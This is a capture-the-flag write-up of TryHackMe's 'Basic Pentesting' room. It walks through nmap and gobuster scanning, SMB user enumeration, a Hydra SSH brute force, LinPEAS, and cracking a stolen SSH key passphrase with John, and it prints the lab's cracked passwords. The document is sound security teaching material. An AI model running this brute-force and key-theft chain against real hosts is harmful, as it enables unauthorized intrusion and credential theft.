# Basic Pentesting 

## Challenge Overview
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Objective:** This report documents a penetration testing engagement on the "Basic Pentesting" CTF challenge. The goal was to identify vulnerabilities in the target machine (IP: 10.201.108.22), gain initial access, escalate privileges, and capture sensitive information. All activities were conducted in a controlled, educational environment for learning purposes only. This report is structured to allow others to follow the steps reproducibly, emphasizing ethical hacking practices.

**Disclaimer:** This is a write-up of a Capture The Flag (CTF) challenge on TryHackMe. No real-world systems were harmed. Penetration testing without authorization is illegal.

## Methodology
The engagement followed a standard penetration testing methodology, divided into phases: Reconnaissance, Enumeration, Exploitation, Privilege Escalation, and Post-Exploitation. Each phase builds on the previous, using open-source tools to simulate real-world attacks.

### Tools Used
- **NMAP:** Network scanning and service enumeration.
- **Gobuster:** Directory brute-forcing for web servers.
- **enum4linux:** SMB enumeration for user discovery.
- **Hydra:** Brute-force password cracking for SSH.
- **LinPEAS:** Privilege escalation enumeration script.
- **John the Ripper:** Password cracking for SSH private keys.
- **OpenSSH:** SSH client for remote access.
- **SCP:** Secure file transfer.

## Detailed Steps

### Phase 1: Reconnaissance
**Step 1: Perform NMAP Scan**  
To identify open ports, services, and versions on the target, an NMAP scan was conducted with service detection (-sV) and default scripts (-sC). This provides an initial overview of potential attack vectors.

Command:
```bash
nmap -sC -sV 10.201.108.22 -oN nmap_report
```

Output:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 18:37 WIB
Nmap scan report for 10.201.108.22
Host is up (0.34s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:26:d2:ce:fd:82:06:b6:4a:63:d5:88:fe:ca:58:c7 (RSA)
|   256 4f:26:2d:e2:01:7e:4c:1d:66:0b:ab:46:26:b6:bc:d0 (ECDSA)
|_  256 3e:ac:8e:8d:23:ce:4e:c7:32:85:2d:b5:bc:b1:06:30 (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -1s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-11-06T11:37:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.86 seconds
```

Key Findings:
- Open ports: 22 (SSH), 80 (HTTP), 139/445 (SMB).
- Services: OpenSSH 8.2p1, Apache 2.4.41, Samba smbd 4.
- OS: Ubuntu Linux.
- Additional info: NetBIOS name "BASIC2", SMB signing enabled but not required.

This scan revealed a web server on port 80 and SMB services, common entry points for enumeration.

### Phase 2: Enumeration
**Step 2: Web Directory Enumeration with Gobuster**  
With a web server identified, Gobuster was used to brute-force directories on the HTTP service to uncover hidden paths.

Command:
```bash
gobuster dir -u http://10.201.108.22/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Output:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.108.22/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://10.201.108.22/development/]
Progress: 4673 / 220561 (2.12%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 4683 / 220561 (2.12%)
===============================================================
Finished
===============================================================
```

Key Findings:
- Discovered `/development` directory (Status: 301).
- The scan was interrupted early but revealed a development folder.

**Step 3: Inspect /development Directory**  
Accessing the discovered directory revealed text files with notes from users "K" and "J", including mentions of Struts (a web framework), SMB configuration, and a password policy reminder.

Contents:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

This provided user names (kay, jan) and hints about potential weak passwords.

**Step 4: SMB Enumeration with enum4linux**  
To enumerate SMB shares and users, enum4linux was run against the target.

Command:
```bash
enum4linux -a 10.201.108.22
```

Output:
```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                         
                                                                                                                    
S-1-22-1-1000 Unix User\kay (Local User)                                                                            
S-1-22-1-1001 Unix User\jan (Local User)
S-1-22-1-1002 Unix User\ubuntu (Local User)
```

Key Findings:
- Users: kay (UID 1000), jan (UID 1001), ubuntu (UID 1002).
- Confirmed user accounts for further targeting.

**Step 5: Brute-Force SSH with Hydra**  
Using the discovered username "jan" and a common wordlist, Hydra was used to crack the SSH password.

Command:
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.201.108.22 ssh
```

Output:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-06 18:58:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.201.108.22:22/
[STATUS] 222.00 tries/min, 222 tries in 00:01h, 14344179 to do in 1076:54h, 14 active
[STATUS] 199.00 tries/min, 597 tries in 00:03h, 14343804 to do in 1201:20h, 14 active
[22][ssh] host: 10.201.108.22   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-06 19:03:09
```

Key Findings:
- Password cracked: "armando".
- Successful login as user "jan".

### Phase 3: Exploitation
**Step 6: Gain Initial Access via SSH**  
With credentials obtained, SSH into the target as "jan".

Command:
```bash
ssh jan@10.201.108.22
```

Key Findings:
- Logged in successfully.
- System info: Ubuntu 20.04.6 LTS, low load, 50% disk usage.

**Step 7: Enumerate Home Directories**  
Checked /home for user directories.

Command:
```bash
ls -la /home
```

Key Findings:
- Directories: jan, kay, ubuntu.
- kay has a .ssh directory, indicating SSH key usage.

### Phase 4: Privilege Escalation
**Step 8: Run LinPEAS for Privilege Escalation**  
Transferred and executed LinPEAS to identify potential escalation vectors.

Commands:
```bash
scp linpeas.sh jan@10.201.108.22:/dev/shm
# On target:
./dev/shm/linpeas.sh
```

Key Findings:
- Discovered kay's SSH private key in /home/kay/.ssh/id_rsa (encrypted).
- The key was readable by jan, allowing theft.

**Step 9: Crack SSH Private Key with John the Ripper**  
Converted the key to a hash and cracked it using John.

Commands:
```bash
ssh2john id_rsa > pass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash
```

Key Findings:
- Passphrase cracked: "beeswax".
- Now able to use kay's SSH key.

**Step 10: Switch to User Kay**  
Used the cracked key to SSH as kay.

Command:
```bash
ssh -i /home/kay/.ssh/id_rsa kay@10.201.108.22
```

Key Findings:
- Logged in as kay.
- Found pass.bak file containing a strong password: "heresareallystrongpasswordthatfollowsthepasswordpolicy$$".

### Phase 5: Post-Exploitation
**Step 11: Capture Flag/Password**  
The pass.bak file contained the root password or flag, completing the challenge.

Command:
```bash
cat pass.bak
```

## Findings
- **Vulnerabilities Exploited:**
  - Weak SSH password for jan (brute-forced).
  - Readable SSH private key for kay (poor permissions).
  - Cracked passphrase on SSH key.
- **Key Takeaways:**
  - Always enforce strong passwords and proper file permissions.
  - SMB and web services can leak user information.
  - Enumeration is crucial for uncovering credentials.
- **Potential Improvements:**
  - Disable unnecessary services (e.g., SMB if not needed).
  - Use multi-factor authentication for SSH.
  - Regularly audit shadow files and SSH keys.

## Conclusion
This CTF challenge demonstrated fundamental penetration testing techniques, from scanning to escalation. By following this report, others can replicate the steps in a safe environment to learn offensive security. Remember, these skills should only be applied ethically and legally. For further practice, explore more TryHackMe rooms or similar platforms.
